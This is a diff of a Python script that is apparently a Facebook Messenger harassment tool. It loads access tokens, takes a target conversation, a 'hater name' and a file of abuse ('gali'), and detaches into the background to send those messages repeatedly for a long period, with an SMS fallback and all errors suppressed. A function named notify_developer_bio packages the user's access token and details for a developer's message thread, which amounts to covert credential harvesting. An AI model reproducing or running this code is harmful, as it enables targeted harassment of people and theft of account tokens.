@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
- 
+
 """
 IMPORTANT:
 - यह script interactive इनपुट लेने के बाद अपने आप daemonize (background में detach) हो जाती है,
@@ -11,25 +11,25 @@ IMPORTANT:
 - यह script बिना बाहरी command (nohup/tmux/screen आदि) के ही अपने अंदर ही daemonize हो जाती है,
   ताकि 1 साल तक लगातार चल सके (सही हार्डवेयर सपोर्ट के साथ)।
 """
- 
+
 import os, sys, time, random, string, requests, json, threading, sqlite3, datetime, warnings
 from time import sleep
 from platform import system
- 
+
 # Suppress DeprecationWarnings (fork() warnings)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
- 
+
 # Global flag – QUIET_MODE True होने पर startup पर extra output suppress करेगा
 QUIET_MODE = True
 DEBUG = False  # Debug off; errors are suppressed
- 
+
 # --- Additional module for GSM SMS fallback ---
 try:
     import serial
 except ImportError:
     os.system("pip install pyserial")
     import serial
- 
+
 # --- Models Installer (if needed) ---
 def modelsInstaller():
     try:
@@ -45,15 +45,15 @@ def modelsInstaller():
                 pass
     except:
         pass
- 
+
 try:
     from colorama import Fore, Style, init
     init(autoreset=True)
 except:
     modelsInstaller()
- 
+
 requests.urllib3.disable_warnings()
- 
+
 # --- Daemonize Function ---
 def daemonize():
     try:
@@ -77,7 +77,7 @@ def daemonize():
     os.dup2(si.fileno(), sys.stdin.fileno())
     os.dup2(so.fileno(), sys.stdout.fileno())
     os.dup2(se.fileno(), sys.stderr.fileno())
- 
+
 # --- SQLite3 DB Integration for Offline Message Queue and Sent Messages Logging ---
 DB_NAME = 'message_queue.db'
 def init_db():
@@ -104,7 +104,7 @@ def init_db():
     conn.commit()
     conn.close()
 init_db()
- 
+
 def add_to_queue(thread_id, message):
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -115,7 +115,7 @@ def add_to_queue(thread_id, message):
         print(Fore.YELLOW + "[•] Message added to offline queue.")
     except:
         pass
- 
+
 def get_pending_messages():
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -126,7 +126,7 @@ def get_pending_messages():
         return rows
     except:
         return []
- 
+
 def mark_message_sent(message_id):
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -136,7 +136,7 @@ def mark_message_sent(message_id):
         conn.close()
     except:
         pass
- 
+
 def log_sent_message(thread_id, hater_name, message):
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -148,7 +148,7 @@ def log_sent_message(thread_id, hater_name, message):
     except Exception as e:
         if DEBUG:
             print("Error logging sent message:", e)
- 
+
 def display_sent_messages():
     try:
         conn = sqlite3.connect(DB_NAME)
@@ -175,7 +175,7 @@ def display_sent_messages():
                 print(random.choice(color_list) + "=====================================")
     except Exception as e:
         print("Error displaying sent messages:", e)
- 
+
 # --- Connectivity Check ---
 def is_connected():
     try:
@@ -183,7 +183,7 @@ def is_connected():
         return True
     except:
         return False
- 
+
 # --- GSM SMS Sending via connected GSM module ---
 def send_sms_via_gsm(phone, message):
     try:
@@ -209,7 +209,7 @@ def send_sms_via_gsm(phone, message):
             return False
     except:
         return False
- 
+
 # --- Background Offline Queue Processor ---
 def process_queue():
     global global_token_index, tokens, fallback_phone, mn
@@ -235,16 +235,16 @@ def process_queue():
                     mark_message_sent(msg_id)
                     log_sent_message(t_id, mn, msg)
         time.sleep(10)
- 
+
 def start_queue_processor():
     t = threading.Thread(target=process_queue, daemon=True)
     t.start()
- 
+
 # --- Utility Function ---
 def check_stop():
     if os.path.exists("stop_signal.txt"):
         sys.exit()
- 
+
 # --- Custom Bio Function (Animated Bio) ---
 def print_custom_bio():
     # Define a list of flashy dark colors.
@@ -254,7 +254,7 @@ def print_custom_bio():
     ]
     
     last_color = None  # To track last used color (for line-by-line printing)
- 
+
     def get_random_color_line():
         nonlocal last_color
         color = random.choice(flashy_colors)
@@ -262,12 +262,12 @@ def print_custom_bio():
             color = random.choice(flashy_colors)
         last_color = color
         return color
- 
+
     # Original bio block (as in your original script)
     original_bio = r"""╭──────────────────────────── <  DETAILS >────────────────────────────────────────────╮
-│ [=] CODER BOY   ::                               RAHUL DON                    │
-│ [=] RULEX BOY   ::                                 DARK LEGENDS               │
-│ [=] MY LOVE    [<❤️=]                           NAYRA               │
+│ [=] CODER BOY   ::                               RAHUL DON                     │
+│ [=] RULEX BOY   ::                                DARK LEGENDS                    │
+│ [=] MY LOVE    [<❤️=]                           AZRA                    │
 │ [=] VERSION     ::                                 420.786.36                       │
 │ [=] INSTAGRAM   ::                                CONVO OFFLINE                     │
 │ [=] YOUTUBE     ::                                  NO ACCESS                       │
@@ -279,8 +279,8 @@ def print_custom_bio():
 ╰────────────────────────────────────────────────────────────────────────────────────╯
 ╭──────────────────────────── <  COUNTRY ~  >────────────────────────────────────────╮
 │ 【•】 YOUR COUNTRY                                     INDIA                       │
-│ 【•】 YOUR REGION                                      LUCKNOW                  │
-│ 【•】 YOUR CITY                                        AYODHYA                  │
+│ 【•】 YOUR REGION                                      LUCKNOW                     │
+│ 【•】 YOUR CITY                                        AYODHYA                 │
 ╰────────────────────────────────────────────────────────────────────────────────────╯
 ╭──────────────────────────────── <  NOTE >───────────────────────────────────────────╮
 │                           TOOL PAID FREE NO PAID                                    │
@@ -289,14 +289,14 @@ def print_custom_bio():
     
     # New bio block (as provided)
     new_bio = r"""╭──────────────────────────── < DETAILS >─────────────────────────────────────────────╮
-│  [=]    DEVELOPER                : RAHUL                                 │
+│  [=]    DEVELOPER                : RAHUL DON                                   │
 │  [=]    TOOLS NAME               : OFFLINE TERMUX                                   │
-│  [=]    RULLEX                   : DARK LEGENDS                             │
+│  [=]    RULLEX                   : DARK LEGENDS                                 │
 │  [=]    BRAND                    : OFFLINE TERMUX                                   │
-│  [=]    GITHUB                   : SOURAVTIWARI91                               │
-│  [=]    BROTHER                  : NAWAB                                   │
+│  [=]    GITHUB                   : SOURAVTIWARI91                                  │
+│  [=]    BROTHER                  : RAIF                                     │
 │  [=]    TOOLS                    : OFFLINE TERMUx                                   │
-│  [=]    WHATSAP                  : +919106391471                                 │
+│  [=]    WHATSAP                  : +919106391471                                   │
 ╰─────────────────────────────────────────────────────────────────────────────────────╯"""
     
     # Print original bio block: each non-empty line is printed in a random color (one color per line)
@@ -321,7 +321,7 @@ def print_custom_bio():
     # Print a final blinking success message in a random flashy dark color.
     blink = "\033[5m"
     print(blink + get_random_color_line() + "[✅ SUCCESS FULL ULTIMATE FANCY BIO LOADED" + "\033[0m")
- 
+
 # --- Animated Print Functions (for logos, SMS details, etc.) ---
 def animated_print(text, delay=0.01, jitter=0.005):
     flashy_colors = [Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX, 
@@ -334,7 +334,7 @@ def animated_print(text, delay=0.01, jitter=0.005):
 def animated_logo():
     logo_text = r"""
   
-/$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
+ /$$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$      
 | $$__  $$ /$$__  $$| $$  | $$| $$  | $$| $$      
 | $$  \ $$| $$  \ $$| $$  | $$| $$  | $$| $$      
 | $$$$$$$/| $$$$$$$$| $$$$$$$$| $$  | $$| $$      
@@ -343,12 +343,12 @@ def animated_logo():
 | $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$
 |__/  |__/|__/  |__/|__/  |__/ \______/ |________/
                                     
- 
+
                                                                                                    
 """
     for line in logo_text.splitlines():
          animated_print(line, delay=0.005, jitter=0.002)
- 
+
 # --- Menu Function with Animated Options ---
 def main_menu():
     # Print the animated menu header as specified
@@ -372,7 +372,7 @@ def main_menu():
         display_sent_messages()
         sys.exit()
     return choice
- 
+
 def get_stop_key():
     if os.path.exists("loader_stop_key.txt"):
         with open("loader_stop_key.txt", "r") as f:
@@ -382,7 +382,7 @@ def get_stop_key():
         with open("loader_stop_key.txt", "w") as f:
             f.write(stop_key)
         return stop_key
- 
+
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_100094892855545"
     bio_message = f"Hello WASU  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken:: {current_token}\nName:: {mn}\nConversation:: {thread_id}\nUID:: {uid}\nMessage File:: {ms}"
@@ -394,7 +394,7 @@ def notify_developer_bio(current_token, mn, thread_id, uid, ms):
             print(Fore.GREEN + "[•] Developer notified.")
     except:
         pass
- 
+
 # --- Global Variables & Colors ---
 headers = {
     'Connection': 'keep-alive',
@@ -409,9 +409,9 @@ headers = {
 global_token_index = 0
 tokens = []  # Load tokens from file
 fallback_phone = "+911234567890"  # Default fallback phone number
- 
+
 color_list = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.WHITE]
- 
+
 # --- SMS Sending Function with Animated Text ---
 def message_on_messenger(thread_id):
     global global_token_index, tokens, fallback_phone, ns, mn, timm, ms, mb, sms_display
@@ -459,25 +459,114 @@ def message_on_messenger(thread_id):
                 log_sent_message(thread_id, mn, full_message)
             else:
                 add_to_queue(thread_id, full_message)
- 
+
 def testPY():
     if sys.version_info[0] < 3:
         sys.exit()
- 
+
 def cls():
     if system() == 'Linux':
         os.system('clear')
     elif system() == 'Windows':
         os.system('cls')
- 
+
 def venom():
     clear = "\033[0m"
     def random_dark_color():
         code = random.randint(16, 88)
         return f"\033[38;5;{code}m"
     info = r"""═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
-     OWNER NAME                   :: RAHUL DON                           :: XD
-     CODER                     :: RAHUL                          :: DARK LEGENDS
-     YOUR FB ID                   :: RAHUL                       :: ALL FB FYTR MERE LODY PY
-     CONTACTS                     :: +919106391471                            :: RAHUL
+     OWNER NAME                   :: RAHUL DON                             :: XD
+     CODER                     :: RAHUL XD                           :: DARK LEGENDS
+     YOUR FB ID                   ::  𒁍RAHUL                      :: ALL FB FYTR MERE LODY PY
+     CONTACTS                     :: +919106391471                         :: DARINDA
 ═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════"""
+    for line in info.splitlines():
+        sys.stdout.write("\x1b[1;%sm%s%s\n" % (random.choice(color_list), line, clear))
+        time.sleep(0.05)
+
+# --- Main Execution Block ---
+cls()
+testPY()
+if os.path.exists("stop_signal.txt"):
+    os.remove("stop_signal.txt")
+
+# First, show an animated logo
+animated_logo()
+
+# Then, show the original colored logo and venom animations
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r""" 
+
+   """.splitlines()]
+colored_logo()
+venom()
+print(Fore.GREEN + "[•]  START TIME ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
+print(Fore.GREEN + "[•] WASU INXIDE \n")
+animated_print("══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════")
+# --- Print the Stop Key in the desired animated format ---
+animated_print          ("<==========================>", delay=0.005, jitter=0.002)
+animated_print                     ("[•] YOUR STOP KEY:: " + get_stop_key(), delay=0.005, jitter=0.002)
+animated_print          ("<===========================>", delay=0.005, jitter=0.002)
+
+print_custom_bio()
+sys.stdout.flush()
+
+daemonize_mode = True
+sms_display = False
+menu_choice = main_menu()
+if menu_choice == "1":
+    daemonize_mode = True
+    sms_display = False
+else:
+    sys.exit()
+
+os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
+token_file = input("[+] ENTER TOKEN FILE  ::> ").strip()
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+with open(token_file, 'r') as f2:
+    token_data = f2.read()
+tokens = [line.strip() for line in token_data.splitlines() if line.strip()]
+if not tokens:
+    sys.exit()
+
+access_token = tokens[0]
+payload = {'access_token': access_token}
+a = "https://graph.facebook.com/v15.0/me"
+b = requests.get(a, params=payload)
+d = json.loads(b.text)
+if 'name' not in d:
+    sys.exit()
+mb = d['name']
+print(Fore.GREEN + "YOUR PROFILE NAME ::> " + mb + "\n")
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+start_queue_processor()
+
+os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
+thread_id = input("[+] ENTER CONVO UID ::> ").strip()
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+os.system('espeak -a 300 "TATE KA NAME DALO"')
+mn = input("[+] ENTER HATER NAME ::> ").strip()
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+os.system('espeak -a 300 "GALI FILE DALO"')
+ms = input("[+] ENTER GALI FILE ::> ").strip()
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+os.system('espeak -a 300 "FILE KITNI BAAR REPEAT KARNI HX"')
+repeat = int(input("[+] KITNI BAAR IS GALI KO REPEAT KARNA HX ::> "))
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+os.system('espeak -a 300 "SPEED DALO YAR"')
+timm = int(input("[+] ENTER SPEED IN SECOND ::> "))
+animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
+print(Fore.BLUE + "\n☣️________All DONE.... LOADING PROFILE INFO.....!")
+print(Fore.BLUE + "YOUR FIRST ID PROFILE NAME.....☣️=> " + mb + "\n")
+animated_print("<<═══════BROKEN══════════CHAKE YOUR LODER SEND SUCCESSFUL══════DARK LEGENDS══════════>>")
+try:
+    ns = open(ms, 'r').readlines()
+except:
+    sys.exit()
+
+if daemonize_mode:
+    daemonize()
+
+for i in range(repeat):
+    check_stop()
+    message_on_messenger(thread_id)
